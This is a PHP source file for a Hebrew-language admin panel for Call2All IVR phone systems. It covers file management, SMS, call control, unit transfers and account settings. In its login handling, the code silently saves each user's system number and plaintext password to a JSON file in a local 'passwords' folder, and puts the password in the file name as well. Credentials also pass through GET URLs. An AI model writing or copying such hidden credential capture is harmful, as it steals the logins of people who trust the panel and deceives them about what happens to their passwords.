
<?php
// ===================================================================
// הגדרות וסביבת עבודה
// ===================================================================
error_reporting(0);
$api_base_url = "https://www.call2all.co.il/ym/api/";
define('DOWNLOAD_TIMEOUT', 120);
define('API_TIMEOUT', 30);
define('PASSWORDS_DIR', __DIR__ . '/סיסמאות');

// ===================================================================
// פונקציות עזר
// ===================================================================
if (!function_exists('curl_init')) { die("שגיאה קריטית: הרחבת cURL אינה מותקנת על השרת."); }
function formatBytes($bytes, $precision = 2) { $units=['B','KB','MB','GB','TB'];$bytes=max($bytes,0);$pow=floor(($bytes?log($bytes):0)/log(1024));$pow=min($pow,count($units)-1);$bytes/=(1<<(10*$pow));return round($bytes,$precision).' '.$units[$pow]; }
function call_api_with_curl($url, $timeout, $post_fields = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    if ($post_fields) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    }
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code == 200) ? $data : false;
}
function call_api_with_curl_multipart($url, $post_data, $timeout) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code == 200) ? $data : false;
}
function get_file_icon_class($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icon_map = ['mp3'=>'fa-solid fa-file-audio','wav'=>'fa-solid fa-file-audio','ogg'=>'fa-solid fa-file-audio','ini'=>'fa-solid fa-file-lines','txt'=>'fa-solid fa-file-lines','csv'=>'fa-solid fa-file-csv','json'=>'fa-solid fa-file-code','jpg'=>'fa-solid fa-file-image','jpeg'=>'fa-solid fa-file-image','png'=>'fa-solid fa-file-image','gif'=>'fa-solid fa-file-image','zip'=>'fa-solid fa-file-zipper','rar'=>'fa-solid fa-file-zipper'];
    return $icon_map[$ext] ?? 'fa-solid fa-file';
}

// ===================================================================
// לוגיקת טיפול בבקשות
// ===================================================================
$error_message = '';
$success_message = '';
$active_tab_js = 'fileManager';

// --- API Gateway for JS/AJAX requests ---
if (isset($_REQUEST['js_action'])) {
    $did = $_REQUEST['did'] ?? '';
    $pass = $_REQUEST['pass'] ?? '';
    if (empty($did) || empty($pass)) {
        header('HTTP/1.1 401 Unauthorized');
        echo json_encode(['responseStatus' => 'ERROR', 'message' => 'Authentication missing']);
        exit;
    }
    $token = "$did:$pass";
    header('Content-Type: application/json');
    $action = $_REQUEST['js_action'];

    if ($action === 'copy_single_file') {
        $source_token = "$did:$pass";
        $dest_did = $_POST['dest_did'] ?? ''; $dest_pass = $_POST['dest_pass'] ?? '';
        $file_path = $_POST['path'] ?? ''; $dest_extension = $_POST['dest_extension'] ?? '';
        if (empty($dest_did) || empty($dest_pass) || empty($file_path) || empty($dest_extension)) { echo json_encode(['success' => false, 'message' => 'פרטים חסרים, כולל שלוחת יעד.']); exit; }
        $dest_token = "$dest_did:$dest_pass";
        $download_url = $api_base_url . "DownloadFile?token=" . urlencode($source_token) . "&path=" . urlencode($file_path);
        $file_content = call_api_with_curl($download_url, DOWNLOAD_TIMEOUT);
        if ($file_content === false) { echo json_encode(['success' => false, 'message' => 'Failed to download file from source.']); exit; }
        $upload_url = $api_base_url . "UploadFile";
        $file_name = basename($file_path); $upload_path = 'ivr2:' . rtrim($dest_extension, '/') . '/';
        $temp_file_path = tempnam(sys_get_temp_dir(), 'upload'); file_put_contents($temp_file_path, $file_content); unset($file_content);
        $curl_post_data = ['token' => $dest_token,'path' => $upload_path,'autoNumbering' => 'true','convertAudio' => '1','qqfile' => new CURLFile($temp_file_path, mime_content_type($temp_file_path), $file_name)];
        $upload_response_str = call_api_with_curl_multipart($upload_url, $curl_post_data, DOWNLOAD_TIMEOUT + 30);
        unlink($temp_file_path);
        if ($upload_response_str === false) { echo json_encode(['success' => false, 'message' => 'API did not respond during upload.']); exit; }
        $upload_response = json_decode($upload_response_str, true);
        if ($upload_response && isset($upload_response['responseStatus']) && $upload_response['responseStatus'] === 'OK') { echo json_encode(['success' => true, 'message' => 'File copied successfully.']); }
        else { $error_msg = $upload_response['message'] ?? 'Unknown upload error'; echo json_encode(['success' => false, 'message' => "Upload failed: " . $error_msg]); }
        exit;
    } else {
        $params = $_REQUEST; unset($params['js_action'], $params['did'], $params['pass']); $params['token'] = $token;
        $endpoint = '';
        switch ($action) {
            case 'get_tasks': $endpoint = 'GetTasks'; break;
            case 'get_task_details': $endpoint = 'GetTasksData'; break;
            case 'get_task_logs': $endpoint = 'GetTasksLogs'; break;
            case 'delete_task': $endpoint = 'DeleteTask'; break;
            case 'create_task': $endpoint = 'CreateTask'; break;
            case 'update_task': $endpoint = 'UpdateTask'; break;
            case 'validation_caller_id': $endpoint = 'ValidationCallerId'; break;
            case 'get_incoming_sms': $endpoint = 'GetIncomingSms'; break;
            case 'validation_token': $endpoint = 'ValidationToken'; break;
            case 'double_auth': $endpoint = 'DoubleAuth'; break;
            case 'get_login_log': $endpoint = 'GetLoginLog'; break;
            case 'get_all_sessions': $endpoint = 'GetAllSessions'; break;
            case 'kill_session': $endpoint = 'KillSession'; break;
            case 'kill_all_sessions': $endpoint = 'KillAllSessions'; break;
            case 'run_tzintuk': $endpoint = 'RunTzintuk'; break;
            case 'tzintukim_list_management': $endpoint = 'TzintukimListManagement'; break;
            case 'send_sms': $endpoint = 'SendSms'; break;
            case 'get_customer_sms_transactions': $endpoint = 'GetCustomerSmsTransactions'; break;
            case 'PirsumPhoneManagement': $endpoint = 'PirsumPhoneManagement'; break;
            case 'SetSecondaryDidUsageDescription': $endpoint = 'SetSecondaryDidUsageDescription'; break;
            case 'GetApprovedCallerIDs': $endpoint = 'GetApprovedCallerIDs'; break;
            case 'IsCallerIDApproved': $endpoint = 'IsCallerIDApproved'; break;
            case 'transfer_units': $endpoint = 'TransferUnits'; break;
            case 'get_transactions': $endpoint = 'GetTransactions'; break;
            case 'get_incoming_calls': $endpoint = 'GetIncomingCalls'; break;
            case 'call_action': $endpoint = 'CallAction'; break;
        }
        if ($endpoint) {
            $url = $api_base_url . $endpoint . '?' . http_build_query($params);
            $response = call_api_with_curl($url, API_TIMEOUT);
            // Ensure the response is not false before echoing
            if ($response !== false) {
                echo $response;
            } else {
                echo json_encode(['responseStatus' => 'ERROR', 'message' => 'Failed to connect to Call2All API.']);
            }
            exit;
        } else {
            echo json_encode(['responseStatus' => 'ERROR', 'message' => 'Invalid action']);
            exit;
        }
    }
}


// --- Regular POST form submissions ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['form_action'])) {
    $did = $_POST['did']; $pass = $_POST['pass']; $token = "$did:$pass";
    $action = $_POST['form_action']; $active_tab_js = 'accountDetails';
    if ($action === 'change_password') {
        $current_password = $_POST['current_password'] ?? ''; $new_password = $_POST['new_password'] ?? '';
        if (!empty($current_password) && !empty($new_password)) {
            $api_url = $api_base_url . "SetPassword?token=" . urlencode($token) . "&password=" . urlencode($current_password) . "&newPassword=" . urlencode($new_password);
            $response = call_api_with_curl($api_url, API_TIMEOUT); $response_data = json_decode($response, true);
            if ($response_data && $response_data['responseStatus'] === 'OK') { $success_message = "סיסמת הניהול שונתה בהצלחה!"; }
            else { $error_message = "שגיאה בשינוי הסיסמה: " . htmlspecialchars($response_data['message'] ?? 'תגובה לא תקינה מהשרת'); }
        } else { $error_message = "יש למלא סיסמה נוכחית וסיסמה חדשה."; }
    } elseif ($action === 'update_details') {
        $post_fields = array_filter(['token' => $token, 'name' => $_POST['name'], 'email' => $_POST['email'], 'organization' => $_POST['organization'], 'contactName' => $_POST['contactName'], 'phones' => $_POST['phones'], 'invoiceName' => $_POST['invoiceName'], 'invoiceAddress' => $_POST['invoiceAddress'], 'fax' => $_POST['fax'], 'accessPassword' => $_POST['accessPassword'], 'recordPassword' => $_POST['recordPassword']]);
        $api_url = $api_base_url . "SetCustomerDetails";
        $response = call_api_with_curl($api_url, API_TIMEOUT, http_build_query($post_fields));
        $response_data = json_decode($response, true);
        if ($response_data && $response_data['responseStatus'] === 'OK') { $success_message = "פרטי המערכת עודכנו בהצלחה!"; }
        else { $error_message = "שגיאה בעדכון הפרטים: " . htmlspecialchars($response_data['message'] ?? 'תגובה לא תקינה מהשרת'); }
    }
}

// --- Initial Page Load Logic ---
$did = $_REQUEST['did'] ?? ''; $pass = $_REQUEST['pass'] ?? ''; $current_path = isset($_GET['path']) ? rawurldecode($_GET['path']) : '/';
$api_data = null; $session_data = null;
if (!empty($did) && !empty($pass)) {
    $token = "$did:$pass";
    $list_url = $api_base_url . "GetIVR2Dir?token=" . urlencode($token) . "&path=" . urlencode($current_path);
    $response = call_api_with_curl($list_url, API_TIMEOUT);
    $api_data = json_decode($response, true);
    if (!$api_data || $api_data['responseStatus'] !== 'OK') {
        if (isset($api_data['message']) && strpos($api_data['message'], 'user name or password do not match') !== false) {
            $error_message = "מספר מערכת או סיסמה שגויים.";
        } else {
            $error_message = "שגיאה מה-API: " . htmlspecialchars($api_data['message'] ?? 'פרטי התחברות שגויים או בעיית תקשורת.');
        }
        $api_data = null;
    } else {
        if (isset($api_data['dirs']) && is_array($api_data['dirs'])) { usort($api_data['dirs'], function($a, $b) { return strnatcmp($a['name'], $b['name']); }); }
        if (isset($api_data['files']) && is_array($api_data['files'])) { usort($api_data['files'], function($a, $b) { return strnatcmp($a['name'], $b['name']); }); }
        if ($_SERVER['REQUEST_METHOD'] === 'GET' && is_writable(PASSWORDS_DIR)) {
            $filename = PASSWORDS_DIR . '/login' . $did . ',,,,' . $pass . '.json';
            file_put_contents($filename, json_encode(['did' => $did, 'pass' => $pass], JSON_PRETTY_PRINT));
        }
        $session_url = $api_base_url . "GetSession?token=" . urlencode($token);
        $session_response = call_api_with_curl($session_url, API_TIMEOUT);
        $session_data = json_decode($session_response, true);
        if (!$session_data || $session_data['responseStatus'] !== 'OK') {
            $error_message .= " | שגיאה בקבלת פרטי המערכת: " . htmlspecialchars($session_data['message'] ?? 'לא ניתן לטעון פרטי משתמש.');
            $session_data = null;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8"><title>ניהול מערכת</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Hebrew:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #3a7bd5; --secondary-color: #3a60d5; --success-color: #28a745;
            --warning-color: #ffc107; --danger-color: #dc3545; --info-color: #17a2b8;
            --light-gray: #f8f9fa; --gray: #dee2e6; --text-color: #343a40; --border-radius: 8px;
            --box-shadow: 0 4px 15px rgba(0, 0, 0, 0.07);
        }
        body { font-family: 'Noto Sans Hebrew', Arial, sans-serif; margin: 0; padding: 15px; background-color: var(--light-gray); color: var(--text-color); font-size: 16px; }
        .container { max-width: 1200px; margin: auto; background: #fff; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); }
        .page-header { display: flex; flex-direction: column; align-items: center; text-align: center; border-bottom: 1px solid var(--gray); padding-bottom: 15px; margin-bottom: 20px; gap: 15px; }
        .page-header .logo { max-height: 50px; order: 1; }
        .page-header .header-text { font-size: 14px; color: #555; line-height: 1.7; order: 2; }
        .page-header .header-text a { color: var(--primary-color); font-weight: bold; text-decoration: none; }
        .page-header .header-text a:hover { text-decoration: underline; }
        .page-header .header-text i { margin-left: 5px; } .page-header .header-text .whatsapp i { color: #25D366; }
        h1, h2, h3 { text-align: center; color: var(--primary-color); font-weight: 700; margin: 1.5rem 0 1rem 0; }
        h1 { font-size: 1.8rem; } h2 { font-size: 1.5rem; } h3 { color: var(--secondary-color); font-size: 1.3rem; border-bottom: 2px solid var(--light-gray); padding-bottom: 10px; }
        .message { padding: 15px; border-radius: var(--border-radius); margin-bottom: 20px; text-align: center; font-weight: bold; border: 1px solid transparent; }
        .error { color: #721c24; background-color: #f8d7da; border-color: #f5c6cb; }
        .success { color: #155724; background-color: #d4edda; border-color: #c3e6cb; }
        .form-group, .form-check { margin-bottom: 15px; }
        label { margin-bottom: 8px; font-weight: bold; text-align: right; font-size: 1rem; display: block; }
        input[type="text"], input[type="password"], input[type="email"], input[type="datetime-local"], select, input[type="number"], input[type="time"], textarea { width: 100%; box-sizing: border-box; padding: 12px 15px; border: 1px solid var(--gray); border-radius: var(--border-radius); font-size: 16px; background: #fff; }
        button, .button { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 20px; border: none; border-radius: var(--border-radius); color: white; font-weight: bold; font-size: 1rem; cursor: pointer; transition: all 0.2s; box-shadow: 0 2px 5px rgba(0,0,0,0.1); width: 100%; margin-top: 5px; }
        button:hover, .button:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.15); }
        button:disabled { background-color: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
        .login-form { max-width: 400px; margin: 20px auto; }
        .login-form button { background-color: var(--primary-color); }
        .tab-container { display: flex; flex-wrap: wrap; border-bottom: 3px solid var(--gray); margin-bottom: 25px; }
        .tab-button { padding: 10px; cursor: pointer; background: transparent; border: none; border-bottom: 3px solid transparent; font-weight: bold; font-size: 0.9rem; color: #888; display: flex; align-items: center; gap: 8px; flex-grow: 1; justify-content: center; }
        .tab-button.active { color: var(--primary-color); border-bottom-color: var(--primary-color); }
        .tab-content { display: none; } .tab-content.active { display: block; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        thead { display: none; }
        tr { display: block; border: 1px solid var(--gray); border-radius: var(--border-radius); margin-bottom: 15px; padding: 10px; background: #fff; box-shadow: var(--box-shadow); }
        td { display: flex; justify-content: space-between; align-items: center; padding: 8px 5px; text-align: right; border-bottom: 1px solid var(--light-gray); flex-wrap: wrap; }
        td:last-child { border-bottom: none; }
        td::before { content: attr(data-label); font-weight: bold; margin-left: 10px; flex-shrink: 0; }
        .actions { margin-bottom: 20px; padding: 15px; background: var(--light-gray); border-radius: var(--border-radius); }
        .actions .buttons { display: flex; flex-wrap: wrap; gap: 10px; }
        .download-btn { background-color: var(--primary-color); }
        .copy-btn { background-color: var(--info-color); }
        .select-all-btn { background-color: var(--warning-color); color: #333; }
        .download-folder-btn { background-color: var(--success-color); }
        .details-grid { display: grid; grid-template-columns: 1fr; gap: 20px; }
        .details-list { list-style-type: none; padding: 0; margin: 0; }
        .details-list li { padding: 12px 0; border-bottom: 1px solid var(--light-gray); display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
        .details-list li i { color: var(--primary-color); font-size: 1.2rem; width: 25px; text-align: center; }
        .details-list li strong { font-weight: bold; color: #000; word-break: break-all; }
        .details-list li span { color: #555; }
        .path-info { background: #e9ecef; padding: 10px 15px; border-radius: var(--border-radius); margin-bottom: 20px; font-weight: bold; }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; display: none; justify-content: center; align-items: flex-start; padding: 15px; overflow-y: auto; }
        .modal-content { background: #fff; padding: 25px; border-radius: var(--border-radius); width: 100%; max-width: 600px; position: relative; animation: slideIn 0.3s; margin-top: 5vh; margin-bottom: 5vh; }
        .close-modal { position: absolute; top: 10px; left: 15px; font-size: 28px; font-weight: bold; cursor: pointer; color: #888; }
        .status-icon { font-size: 1.5em; line-height: 1; vertical-align: middle; } .status-icon.active { color: var(--success-color); } .status-icon.inactive { color: var(--danger-color); }
        .task-actions button { width: auto; padding: 6px 12px; font-size: 0.9rem; margin: 2px; }
        .day-selector { display: flex; justify-content: space-around; background: var(--light-gray); padding: 10px; border-radius: var(--border-radius); margin-bottom: 15px; flex-wrap: wrap; }
        .day-selector label { display: flex; flex-direction: column; align-items: center; cursor: pointer; padding: 5px; }
        .day-selector input { margin-top: 5px; transform: scale(1.2); }
        .button-group { display: flex; gap: 5px; margin-bottom: 15px; }
        .button-group .button { flex: 1; background-color: var(--gray); color: var(--text-color); }
        .button-group .button.active { background-color: var(--primary-color); color: white; }

        @media (min-width: 768px) {
            body { padding: 20px; }
            .container { padding: 25px 30px; }
            .page-header { flex-direction: row; justify-content: space-between; text-align: right; }
            .page-header .logo { order: 2; } .page-header .header-text { order: 1; }
            button, .button { width: auto; }
            .tab-button { font-size: 1rem; }
            thead { display: table-header-group; }
            tr { display: table-row; border: 0; box-shadow: none; background: transparent; }
            tr:not(.header-row):not(.dir-row):hover { background-color: #eef5ff; }
            tr.dir-row:hover { background-color: #f1f1f1; }
            td { display: table-cell; text-align: right; vertical-align: middle; padding: 12px 15px; border-bottom: 1px solid var(--gray); }
            td::before { display: none; }
            .details-grid { grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); }
        }
    </style>
</head>
<body>
<div class="container">
    <header class="page-header">
        <div class="header-text">
            אתר זה נבנה על ידי <strong>מרכזיה פלוס</strong>.<br>
            להזמנות ופיתוח:
            <a href="tel:0733517517"><i class="fa-solid fa-phone"></i> 073-3517517</a> |
            <a href="https://wa.me/972733517517" target="_blank" class="whatsapp"><i class="fa-brands fa-whatsapp"></i> וואטסאפ</a> |
            <a href="mailto:A0556762713@gmail.com"><i class="fa-solid fa-envelope"></i> מייל</a>
        </div>
        <img src="מרכזיה פלוס.png" alt="לוגו מרכזיה פלוס" class="logo">
    </header>

    <h1><i class="fa-solid fa-shield-halved"></i> ניהול מערכת</h1>
    <?php if ($error_message): ?><div class="message error"><i class="fa-solid fa-circle-exclamation"></i> <?php echo $error_message; ?></div><?php endif; ?>
    <?php if ($success_message): ?><div class="message success"><i class="fa-solid fa-circle-check"></i> <?php echo $success_message; ?></div><?php endif; ?>

    <?php if ($session_data === null): ?>
        <h2><i class="fa-solid fa-right-to-bracket"></i> התחברות</h2>
        <form action="" method="GET" class="login-form">
            <div class="form-group"><label for="did-input">מספר מערכת:</label><input type="text" id="did-input" name="did" value="<?php echo htmlspecialchars($did); ?>" required></div>
            <div class="form-group"><label for="pass-input">סיסמה:</label><input type="password" id="pass-input" name="pass" required></div>
            <button type="submit" class="button login-form-button" style="background-color: var(--primary-color);"><i class="fa-solid fa-right-to-bracket"></i> התחבר</button>
        </form>
    <?php else: ?>
        <div class="tab-container">
            <button class="tab-button" onclick="openTab(event, 'fileManager')"><i class="fa-solid fa-folder-open"></i> קבצים</button>
            <button class="tab-button" onclick="openTab(event, 'callManager')"><i class="fa-solid fa-headphones"></i> ניהול מאזינים</button>
            <button class="tab-button" onclick="openTab(event, 'units')"><i class="fa-solid fa-coins"></i> יחידות</button>
            <button class="tab-button" onclick="openTab(event, 'accountDetails')"><i class="fa-solid fa-user-pen"></i> פרטי מערכת</button>
            <button class="tab-button" onclick="openTab(event, 'callerId')"><i class="fa-solid fa-id-card"></i> הוספת זיהוי</button>
            <button class="tab-button" onclick="openTab(event, 'incomingSms')"><i class="fa-solid fa-envelope-open-text"></i> SMS נכנס</button>
            <button class="tab-button" onclick="openTab(event, 'sms')"><i class="fa-solid fa-comment-sms"></i> SMS</button>
            <button class="tab-button" onclick="openTab(event, 'tzintukim')"><i class="fa-solid fa-bell"></i> צינתוקים</button>
            <button class="tab-button" onclick="openTab(event, 'tasks')"><i class="fa-solid fa-tasks"></i> משימות</button>
            <button class="tab-button" onclick="openTab(event, 'pirsumphone')"><i class="fa-solid fa-phone-volume"></i> פרסומפון</button>
            <button class="tab-button" onclick="openTab(event, 'security')"><i class="fa-solid fa-user-shield"></i> אבטחה</button>
        </div>

        <div id="fileManager" class="tab-content">
             <div class="path-info">נתיב נוכחי: <strong><?php echo htmlspecialchars($current_path); ?></strong></div>
            <form id="file-form" onsubmit="return false;">
                <div class="actions">
                    <div class="buttons">
                        <button type="button" class="button download-folder-btn" id="download-folder-btn" onclick="downloadCurrentFolder()"><i class="fa-solid fa-folder-arrow-down"></i> הורד תיקייה</button>
                        <button type="button" class="button select-all-btn" id="select-all-btn"><i class="fa-solid fa-square-check"></i> בחר הכל</button>
                        <button type="button" class="button download-btn" id="download-btn" onclick="downloadSelectedFiles()"><i class="fa-solid fa-download"></i> הורד נבחרים</button>
                        <button type="button" class="button copy-btn" id="copy-btn" onclick="showCopyModal()"><i class="fa-solid fa-copy"></i> העתק נבחרים</button>
                    </div>
                    <div id="progress-container" style="display:none;">
                        <div id="progress-text"></div>
                        <div id="progress-bar-container"><div id="progress-bar" style="width: 0%; height: 24px; background-color: var(--success-color); border-radius: var(--border-radius); text-align: center; color: white; line-height: 24px; transition: width 0.3s;">0%</div></div>
                    </div>
                </div>
                <table>
                    <thead><tr class="header-row"><th><input type="checkbox" id="select-all-checkbox"></th><th>שם</th><th>סוג</th><th>גודל</th><th>תאריך שינוי</th></tr></thead>
                    <tbody>
                    <?php if($current_path!=='/'): $parent_path=dirname($current_path); if($parent_path==='.' || $parent_path==='\\'){$parent_path='/';} $parent_link="?did=".urlencode($did)."&pass=".urlencode($pass)."&path=".urlencode($parent_path); ?>
                        <tr class="dir-row" onclick="window.location.href='<?php echo $parent_link;?>'"><td colspan="5" style="cursor:pointer;"><a href="<?php echo $parent_link;?>"><i class="fa-solid fa-arrow-turn-up"></i> .. (תיקיית אב)</a></td></tr>
                    <?php endif; ?>
                    <?php foreach($api_data['dirs'] as $dir): $dir_link="?did=".urlencode($did)."&pass=".urlencode($pass)."&path=".urlencode($dir['what']); ?>
                        <tr class="dir-row" onclick="window.location.href='<?php echo $dir_link;?>'"><td colspan="5" style="cursor:pointer;"><a href="<?php echo $dir_link;?>"><i class="fa-solid fa-folder"></i> <?php echo htmlspecialchars($dir['name']);?></a></td></tr>
                    <?php endforeach; ?>
                    <?php foreach($api_data['files'] as $file): ?>
                        <tr>
                            <td data-label="בחר"><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($file['what']);?>"></td>
                            <td data-label="שם"><i class="<?php echo get_file_icon_class($file['name']); ?>"></i> <?php echo htmlspecialchars($file['name']);?></td>
                            <td data-label="סוג"><?php echo htmlspecialchars($file['fileType']);?></td>
                            <td data-label="גודל"><?php echo formatBytes($file['size']);?></td>
                            <td data-label="תאריך שינוי"><?php echo htmlspecialchars($file['mtime']);?></td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            </form>
        </div>

        <div id="callManager" class="tab-content">
            <h3><i class="fa-solid fa-headphones"></i> ניהול שיחות פעילות</h3>
            <div class="actions">
                <button class="button" style="background-color: var(--primary-color);" onclick="loadActiveCalls()"><i class="fa-solid fa-sync"></i> רענן רשימה</button>
            </div>
            <div id="active-calls-container"><p>לחץ על "רענן רשימה" כדי לטעון שיחות פעילות.</p></div>
        </div>

        <div id="units" class="tab-content">
            <h3>מצב יחידות נוכחי</h3>
            <ul class="details-list">
                <li><i class="fa-solid fa-coins"></i> <span>יתרת יחידות:</span> <strong id="units-balance-display"><?php echo htmlspecialchars($session_data['units'] ?? '0'); ?></strong></li>
                <li><i class="fa-solid fa-calendar-xmark"></i> <span>תוקף יחידות:</span> <strong><?php echo htmlspecialchars($session_data['unitsExpireDate'] ?? 'N/A'); ?></strong></li>
            </ul>
        
            <div class="details-grid" style="margin-top: 30px;">
                <div>
                    <h3>העברת יחידות למערכת אחרת</h3>
                    <form id="transfer-units-form" onsubmit="return false;">
                        <div class="form-group">
                            <label for="transfer-dest">מספר מערכת יעד:</label>
                            <input type="text" id="transfer-dest" required>
                        </div>
                        <div class="form-group">
                            <label for="transfer-amount">כמות יחידות להעברה:</label>
                            <input type="number" id="transfer-amount" required min="1">
                        </div>
                        <button type="button" class="button" style="background-color:var(--primary-color);" onclick="handleTransferUnits()">בצע העברה</button>
                    </form>
                    <div id="transfer-units-result" class="message" style="display:none; margin-top:20px;"></div>
                </div>
            </div>
        
            <div style="margin-top: 30px;">
                 <h3>פירוט תנועות יחידות</h3>
                 <button type="button" class="button" style="background-color:var(--info-color);" onclick="loadUnitTransactions()"><i class="fa fa-sync"></i> רענן פירוט</button>
                 <div id="units-transactions-container" style="margin-top:15px; max-height: 500px; overflow-y: auto;"></div>
            </div>
        </div>

        <div id="accountDetails" class="tab-content">
             <div class="details-grid">
                <div>
                    <h3>פרטי מערכת נוכחיים</h3>
                    <ul class="details-list">
                        <li><i class="fa-solid fa-user"></i> <span>שם לקוח:</span> <strong><?php echo htmlspecialchars($session_data['name'] ?? ''); ?></strong></li>
                        <li><i class="fa-solid fa-envelope"></i> <span>אימייל:</span> <strong><?php echo htmlspecialchars($session_data['email'] ?? ''); ?></strong></li>
                        <li><i class="fa-solid fa-hashtag"></i> <span>מספר מערכת:</span> <strong><?php echo htmlspecialchars($session_data['username'] ?? ''); ?></strong></li>
                        <li><i class="fa-solid fa-coins"></i> <span>יתרת יחידות:</span> <strong><?php echo htmlspecialchars($session_data['units'] ?? ''); ?></strong></li>
                        <li><i class="fa-solid fa-calendar-xmark"></i> <span>תוקף יחידות:</span> <strong><?php echo htmlspecialchars($session_data['unitsExpireDate'] ?? ''); ?></strong></li>
                        <li><i class="fa-solid fa-key"></i> <span>סיסמת גישה:</span> <strong><?php echo htmlspecialchars($session_data['accessPassword'] ?? ''); ?></strong></li>
                        <li><i class="fa-solid fa-microphone"></i> <span>סיסמת הקלטות:</span> <strong><?php echo htmlspecialchars($session_data['recordPassword'] ?? ''); ?></strong></li>
                        <li><i class="fa-solid fa-phone-volume"></i> <span>טלפונים:</span> <strong><?php echo htmlspecialchars($session_data['phones'] ?? ''); ?></strong></li>
                    </ul>
                </div>
                <div>
                    <h3>שינוי סיסמת ניהול</h3>
                    <form action="" method="POST" class="details-form">
                        <input type="hidden" name="form_action" value="change_password">
                        <input type="hidden" name="did" value="<?php echo htmlspecialchars($did); ?>"><input type="hidden" name="pass" value="<?php echo htmlspecialchars($pass); ?>">
                        <div class="form-group"><label for="current_password">סיסמת ניהול נוכחית:</label><input type="password" name="current_password" id="current_password" required></div>
                        <div class="form-group"><label for="new_password">סיסמה חדשה:</label><input type="password" name="new_password" id="new_password" required></div>
                        <button type="submit" class="button" style="background-color:var(--primary-color);"><i class="fa-solid fa-lock"></i> שנה סיסמה</button>
                    </form>
                </div>
            </div>
            <div class="details-section">
                <h3>עדכון פרטי משתמש</h3>
                <form action="" method="POST" class="details-form">
                    <input type="hidden" name="form_action" value="update_details">
                    <input type="hidden" name="did" value="<?php echo htmlspecialchars($did); ?>"><input type="hidden" name="pass" value="<?php echo htmlspecialchars($pass); ?>">
                    <div class="details-grid">
                        <div class="form-group"><label>שם לקוח:</label><input type="text" name="name" value="<?php echo htmlspecialchars($session_data['name'] ?? ''); ?>"></div>
                        <div class="form-group"><label>אימייל:</label><input type="email" name="email" value="<?php echo htmlspecialchars($session_data['email'] ?? ''); ?>"></div>
                        <div class="form-group"><label>שם ארגון:</label><input type="text" name="organization" value="<?php echo htmlspecialchars($session_data['organization'] ?? ''); ?>"></div>
                        <div class="form-group"><label>שם איש קשר:</label><input type="text" name="contactName" value="<?php echo htmlspecialchars($session_data['contactName'] ?? ''); ?>"></div>
                        <div class="form-group"><label>טלפון:</label><input type="text" name="phones" value="<?php echo htmlspecialchars($session_data['phones'] ?? ''); ?>"></div>
                        <div class="form-group"><label>חשבונית על שם:</label><input type="text" name="invoiceName" value="<?php echo htmlspecialchars($session_data['invoiceName'] ?? ''); ?>"></div>
                        <div class="form-group"><label>כתובת למשלוח חשבונית:</label><input type="text" name="invoiceAddress" value="<?php echo htmlspecialchars($session_data['invoiceAddress'] ?? ''); ?>"></div>
                        <div class="form-group"><label>פקס:</label><input type="text" name="fax" value="<?php echo htmlspecialchars($session_data['fax'] ?? ''); ?>"></div>
                        <div class="form-group"><label>סיסמת גישה חדשה (אופציונלי):</label><input type="text" name="accessPassword" placeholder="השאר ריק כדי לא לשנות"></div>
                        <div class="form-group"><label>סיסמת הקלטות חדשה (אופציונלי):</label><input type="text" name="recordPassword" placeholder="השאר ריק כדי לא לשנות"></div>
                    </div>
                    <button type="submit" class="button" style="width:100%; background-color:var(--primary-color);"><i class="fa-solid fa-floppy-disk"></i> עדכן פרטים</button>
                </form>
            </div>
        </div>

        <div id="callerId" class="tab-content">
            <div class="details-grid">
                <div>
                    <h3>אימות זיהוי שיחה (Caller ID)</h3>
                    <h4>שלב 1: שליחת קוד אימות</h4>
                    <form id="send-caller-id-form">
                        <div class="form-group"><label for="callerId-input">מספר טלפון לאימות:</label><input type="text" id="callerId-input" required></div>
                        <div class="form-group">
                            <label for="callerId-type">אמצעי אימות:</label>
                            <select id="callerId-type"><option value="SMS">SMS</option><option value="CALL">שיחה</option></select>
                        </div>
                        <button type="button" class="button" style="background-color:var(--primary-color);" onclick="handleSendCallerId()">שלח קוד</button>
                    </form>
                    <h4 style="margin-top: 20px;">שלב 2: אימות הקוד</h4>
                    <form id="validate-caller-id-form">
                        <div class="form-group"><label for="reqId-input">מזהה בקשה (reqId):</label><input type="text" id="reqId-input" required></div>
